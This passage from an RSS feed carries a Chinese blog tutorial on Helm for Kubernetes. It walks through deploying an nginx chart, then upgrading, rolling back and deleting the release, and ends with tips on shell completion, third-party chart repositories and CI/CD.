  enabled: false
  hosts:
  - host: chart-example.local
    paths: []
  tls: []
nameOverride: &quot;&quot;
nodeSelector: {}
replicaCount: 1
resources: {}
service:
  port: 80
  type: ClusterIP
tolerations: []

HOOKS:
---
# myapp-test-test-connection
apiVersion: v1
kind: Pod
metadata:
  name: &quot;myapp-test-test-connection&quot;
  labels:
    app.kubernetes.io/name: myapp
    helm.sh/chart: myapp-0.1.0
    app.kubernetes.io/instance: myapp-test
    app.kubernetes.io/managed-by: Tiller
  annotations:
    &quot;helm.sh/hook&quot;: test-success
spec:
  containers:
    - name: wget
      image: busybox
      command: ['wget']
      args:  ['myapp-test:80']
  restartPolicy: Never
MANIFEST:

---
# Source: myapp/templates/service.yaml
apiVersion: v1
kind: Service
metadata:
  name: myapp-test
  labels:
    app.kubernetes.io/name: myapp
    helm.sh/chart: myapp-0.1.0
    app.kubernetes.io/instance: myapp-test
    app.kubernetes.io/managed-by: Tiller
spec:
  type: ClusterIP
  ports:
    - port: 80
      targetPort: http
      protocol: TCP
      name: http
  selector:
    app.kubernetes.io/name: myapp
    app.kubernetes.io/instance: myapp-test
---
# Source: myapp/templates/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp-test
  labels:
    app.kubernetes.io/name: myapp
    helm.sh/chart: myapp-0.1.0
    app.kubernetes.io/instance: myapp-test
    app.kubernetes.io/managed-by: Tiller
spec:
  replicas: 1
  selector:
    matchLabels:
      app.kubernetes.io/name: myapp
      app.kubernetes.io/instance: myapp-test
  template:
    metadata:
      labels:
        app.kubernetes.io/name: myapp
        app.kubernetes.io/instance: myapp-test
    spec:
      containers:
        - name: myapp
          image: &quot;nginx:stable&quot;
          imagePullPolicy: IfNotPresent
          ports:
            - name: http
              containerPort: 80
              protocol: TCP
          livenessProbe:
            httpGet:
              path: /
              port: http
          readinessProbe:
            httpGet:
              path: /
              port: http
          resources:
            {}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;验证完成没有问题后，我们就可以使用以下命令将其部署到 Kubernetes 上了。&lt;br/&gt;# 部署时需指定 Chart 名及 Release（部署的实例）名。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
[root@master ~]# helm install local/myapp --name myapp-test
NAME:   myapp-test
LAST DEPLOYED: Fri Apr  5 11:19:02 2019
NAMESPACE: default
STATUS: DEPLOYED

RESOURCES:
==&amp;gt; v1/Deployment
NAME        READY  UP-TO-DATE  AVAILABLE  AGE
myapp-test  0/1    0           0          0s

==&amp;gt; v1/Service
NAME        TYPE       CLUSTER-IP  EXTERNAL-IP  PORT(S)  AGE
myapp-test  ClusterIP  10.10.10.3  &amp;lt;none&amp;gt;       80/TCP   0s


NOTES:
1. Get the application URL by running these commands:
  export POD_NAME=$(kubectl get pods --namespace default -l &quot;app.kubernetes.io/name=myapp,app.kubernetes.io/instance=myapp-test&quot; -o jsonpath=&quot;{.items[0].metadata.name}&quot;)
  echo &quot;Visit http://127.0.0.1:8080 to use your application&quot;
  kubectl port-forward $POD_NAME 8080:80
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    注：helm install 默认会用到 socat，需要在所有节点上安装 socat 软件包。&lt;/p&gt;&lt;p&gt;完成部署后，现在 Nginx 就已经部署到 Kubernetes 集群上。在本地主机上执行提示中的命令后，就可在本机访问到该 Nginx 实例。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ export POD_NAME=$(kubectl get pods --namespace default -l &quot;app=myapp,release=myapp-test&quot; -o jsonpath=&quot;{.items[0].metadata.name}&quot;)
$ echo &quot;Visit http://127.0.0.1:8080 to use your application&quot;
$ kubectl port-forward $POD_NAME 8080:80
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在本地访问 Nginx&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ curl http://127.0.0.1:8080
.....
&amp;lt;title&amp;gt;Welcome to nginx!&amp;lt;/title&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;Welcome to nginx!&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.&amp;lt;/p&amp;gt;
......
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;使用下面的命令列出的所有已部署的 Release 以及其对应的 Chart。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm list
NAME          REVISION    UPDATED                     STATUS      CHART          APP VERSION    NAMESPACE
myapp-test    1           Fri Apr  5 11:19:02 2019    DEPLOYED    myapp-0.1.0    1.0            default
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;你还可以使用 helm status 查询一个特定的 Release 的状态。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
[root@master k8s_yaml]# helm status myapp-test
LAST DEPLOYED: Fri Apr  5 11:19:02 2019
NAMESPACE: default
STATUS: DEPLOYED

RESOURCES:
==&amp;gt; v1/Deployment
NAME        READY  UP-TO-DATE  AVAILABLE  AGE
myapp-test  1/1    1           1          16m

==&amp;gt; v1/Pod(related)
NAME                         READY  STATUS   RESTARTS  AGE
myapp-test-854fbbc6dc-6h7sm  1/1    Running  0         16m

==&amp;gt; v1/Service
NAME        TYPE       CLUSTER-IP  EXTERNAL-IP  PORT(S)  AGE
myapp-test  ClusterIP  10.10.10.3  &amp;lt;none&amp;gt;       80/TCP   16m


NOTES:
1. Get the application URL by running these commands:
  export POD_NAME=$(kubectl get pods --namespace default -l &quot;app.kubernetes.io/name=myapp,app.kubernetes.io/instance=myapp-test&quot; -o jsonpath=&quot;{.items[0].metadata.name}&quot;)
  echo &quot;Visit http://127.0.0.1:8080 to use your application&quot;
  kubectl port-forward $POD_NAME 8080:80
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;升级和回退一个应用&lt;/p&gt;&lt;p&gt;从上面 helm list 输出的结果中我们可以看到有一个 Revision（更改历史）字段，该字段用于表示某一个 Release 被更新的次数，我们可以用该特性对已部署的 Release 进行回滚。&lt;/p&gt;&lt;p&gt;    修改 Chart.yaml 文件&lt;/p&gt;&lt;p&gt;将版本号从 0.1.0 修改为 0.2.0, 然后使用 helm package 命令打包并发布到本地仓库。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ cat myapp/Chart.yaml
apiVersion: v1
appVersion: &quot;1.0&quot;
description: A Helm chart for Kubernetes
name: myapp
version: 0.2.0

$ helm package myapp
Successfully packaged chart and saved it to: /root/k8s_yaml/helm/myapp-0.2.0.tgz
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    查询本地仓库中的 Chart 信息&lt;/p&gt;&lt;p&gt;我们可以看到在本地仓库中 myapp 有两个版本。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm search myapp -l
NAME             CHART VERSION    APP VERSION    DESCRIPTION
local/myapp    0.2.0            1.0            A Helm chart for Kubernetes
local/myapp    0.1.0            1.0            A Helm chart for Kubernetes
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 升级一个应用&lt;br/&gt;现在用 helm upgrade 命令将已部署的 mike-test 升级到新版本。你可以通过 --version 参数指定需要升级的版本号，如果没有指定版本号，则缺省使用最新版本。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
[root@master helm]# helm upgrade myapp-test local/myapp
Release &quot;myapp-test&quot; has been upgraded. Happy Helming!
LAST DEPLOYED: Fri Apr  5 11:39:38 2019
NAMESPACE: default
STATUS: DEPLOYED

RESOURCES:
==&amp;gt; v1/Deployment
NAME        READY  UP-TO-DATE  AVAILABLE  AGE
myapp-test  1/1    1           1          20m

==&amp;gt; v1/Pod(related)
NAME                         READY  STATUS   RESTARTS  AGE
myapp-test-854fbbc6dc-6h7sm  1/1    Running  0         20m

==&amp;gt; v1/Service
NAME        TYPE       CLUSTER-IP  EXTERNAL-IP  PORT(S)  AGE
myapp-test  ClusterIP  10.10.10.3  &amp;lt;none&amp;gt;       80/TCP   20m


NOTES:
1. Get the application URL by running these commands:
  export POD_NAME=$(kubectl get pods --namespace default -l &quot;app.kubernetes.io/name=myapp,app.kubernetes.io/instance=myapp-test&quot; -o jsonpath=&quot;{.items[0].metadata.name}&quot;)
  echo &quot;Visit http://127.0.0.1:8080 to use your application&quot;
  kubectl port-forward $POD_NAME 8080:80
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;完成后，可以看到已部署的 mike-test 被升级到 0.2.0 版本。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
[root@master helm]# helm list
NAME          REVISION    UPDATED                     STATUS      CHART          APP VERSION    NAMESPACE
myapp-test    2           Fri Apr  5 11:39:38 2019    DEPLOYED    myapp-0.2.0    1.0            default  
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 回滚一个应用&lt;/p&gt;&lt;p&gt;如果更新后的程序由于某些原因运行有问题，需要回退到旧版本的应用。首先我们可以使用 helm history 命令查看一个 Release 的所有变更记录。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
[root@master helm]# helm history  myapp-test
REVISION    UPDATED                     STATUS        CHART          DESCRIPTION     
1           Fri Apr  5 11:19:02 2019    SUPERSEDED    myapp-0.1.0    Install complete
2           Fri Apr  5 11:39:38 2019    DEPLOYED      myapp-0.2.0    Upgrade complete
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其次，我们可以使用下面的命令对指定的应用进行回退。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm rollback myapp-test 1
Rollback was a success! Happy Helming!
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    注：其中的参数 1 是 helm history 查看到 Release 的历史记录中 REVISION 对应的值。&lt;/p&gt;&lt;p&gt;最后，我们使用 helm list 和 helm history 命令都可以看到 myapp 的版本已经回退到 0.1.0 版本。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm list
NAME          REVISION    UPDATED                     STATUS      CHART          APP VERSION    NAMESPACE
myapp-test    3           Fri Apr  5 11:42:13 2019    DEPLOYED    myapp-0.1.0    1.0            default  

$ helm history myapp-test
REVISION    UPDATED                     STATUS        CHART          DESCRIPTION     
1           Fri Apr  5 11:19:02 2019    SUPERSEDED    myapp-0.1.0    Install complete
2           Fri Apr  5 11:39:38 2019    SUPERSEDED    myapp-0.2.0    Upgrade complete
3           Fri Apr  5 11:42:13 2019    DEPLOYED      myapp-0.1.0    Rollback to 1 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;删除一个应用&lt;/p&gt;&lt;p&gt;如果需要删除一个已部署的 Release，可以利用 helm delete 命令来完成删除。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm delete myapp-test
release &quot;myapp-test&quot; deleted
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;确认应用是否删除，该应用已被标记为 DELETED 状态。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm ls -a myapp-test
NAME          REVISION    UPDATED                     STATUS     CHART          APP VERSION    NAMESPACE
myapp-test    3           Fri Apr  5 11:42:13 2019    DELETED    myapp-0.1.0    1.0            default  
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;也可以使用 --deleted 参数来列出已经删除的 Release&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm ls --deleted
NAME          REVISION    UPDATED                     STATUS     CHART              APP VERSION    NAMESPACE
mem1          1           Sun Mar 24 20:58:18 2019    DELETED    memcached-2.7.0    1.5.12         default  
myapp-test    3           Fri Apr  5 11:42:13 2019    DELETED    myapp-0.1.0        1.0            default  
redis1        1           Sun Mar 24 21:03:33 2019    DELETED    redis-6.4.3        4.0.14         default  
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;从上面的结果也可以看出，默认情况下已经删除的 Release 只是将状态标识为 DELETED 了 ，但该 Release 的历史信息还是继续被保存的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm hist myapp-test
REVISION    UPDATED                     STATUS        CHART          DESCRIPTION      
1           Fri Apr  5 11:19:02 2019    SUPERSEDED    myapp-0.1.0    Install complete
2           Fri Apr  5 11:39:38 2019    SUPERSEDED    myapp-0.2.0    Upgrade complete
3           Fri Apr  5 11:42:13 2019    DELETED       myapp-0.1.0    Deletion complete
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果要移除指定 Release 所有相关的 Kubernetes 资源和 Release 的历史记录，可以用如下命令：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm delete --purge myapp-test
release &quot;myapp-test&quot; deleted
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;再次查看已删除的 Release，已经无法找到相关信息。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm hist mike-test
Error: release: &quot;myapp-test&quot; not found
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;# helm ls 命令也已均无查询记录。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm ls --deleted
$ helm ls -a mike-test
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;五、Helm 其它使用技巧&lt;/h3&gt;
&lt;p&gt;  如何设置 helm 命令自动补全？&lt;/p&gt;&lt;p&gt;为了方便 helm 命令的使用，Helm 提供了自动补全功能，如果使用 ZSH 请执行：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ source &amp;lt;(helm completion zsh)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果使用 BASH 请执行：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ source &amp;lt;(helm completion bash)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    如何使用第三方的 Chart 存储库？&lt;/p&gt;&lt;p&gt;随着 Helm 越来越普及，除了使用预置官方存储库，三方仓库也越来越多了（前提是网络是可达的）。你可以使用如下命令格式添加三方 Chart 存储库。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm repo add 存储库名 存储库URL
$ helm repo update
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;一些三方存储库资源:&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
# Prometheus Operator
https://github.com/coreos/prometheus-operator/tree/master/helm

# Bitnami Library for Kubernetes
https://github.com/bitnami/charts

# Openstack-Helm
https://github.com/att-comdev/openstack-helm
https://github.com/sapcc/openstack-helm

# Tick-Charts
https://github.com/jackzampolin/tick-charts
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;六、Helm 如何结合 CI/CD ？&lt;/h3&gt;
&lt;p&gt;采用 Helm 可以把零散的 Kubernetes 应用配置文件作为一个 Chart 管理，Chart 源码可以和源代码一起放到 Git 库中管理。通过把 Chart 参数化，可以在测试环境和生产环境采用不同的 Chart 参数配置。&lt;/p&gt;&lt;p&gt;下图是采用了 Helm 的一个 CI/CD 流程&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1271786/201904/1271786-20190405131152633-48507074.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;    Helm 如何管理多环境下 (Test、Staging、Production) 的业务配置？&lt;/p&gt;&lt;p&gt;Chart 是支持参数替换的，可以把业务配置相关的参数设置为模板变量。使用 helm install 命令部署的时候指定一个参数值文件，这样就可以把业务参数从 Chart 中剥离了。例如： helm install --values=values-production.yaml wordpress。&lt;/p&gt;&lt;p&gt;    Helm 如何解决服务依赖？&lt;/p&gt;&lt;p&gt;在 Chart 里可以通过 requirements.yaml 声明对其它 Chart 的依赖关系。如下面声明表明 Chart 依赖 Apache 和 MySQL 这两个第三方 Chart。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
dependencies:
- name: mariadb
  version: 2.1.1
  repository: https://kubernetes-charts.storage.googleapis.com/
  condition: mariadb.enabled
  tags:
    - wordpress-database
- name: apache
    version: 1.4.0
    repository: https://kubernetes-charts.storage.googleapis.com/
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    如何让 Helm 连接到指定 Kubernetes 集群？&lt;/p&gt;&lt;p&gt;Helm 默认使用和 kubectl 命令相同的配置访问 Kubernetes 集群，其配置默认在 ~/.kube/config 中。&lt;/p&gt;&lt;p&gt;    如何在部署时指定命名空间？&lt;/p&gt;&lt;p&gt;helm install 默认情况下是部署在 default 这个命名空间的。如果想部署到指定的命令空间，可以加上 --namespace 参数，比如：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm install local/myapp --name mike-test --namespace mynamespace
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    如何查看已部署应用的详细信息？&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm get myapp-test
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;默认情况下会显示最新的版本的相关信息，如果想要查看指定发布版本的信息可加上 --revision 参数。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm get  --revision 1  myapp-test
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 参考：&lt;br/&gt;https://daemonza.github.io/2017/02/20/using-helm-to-deploy-to-kubernetes/&lt;/p&gt;
</description>
<pubDate>Sun, 28 Apr 2019 13:22:00 +0000</pubDate>
<dc:creator>渣渣辉</dc:creator>
<og:description>Helm学习笔记 Helm 是 Kubernetes 生态系统中的一个软件包管理工具。本文将介绍 Helm 中的相关概念和基本工作原理，并通过一个具体的示例学习如何使用 Helm 打包、分发、安装、升</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Dev0ps/p/10658491.html</dc:identifier>
</item>
</channel>
</rss>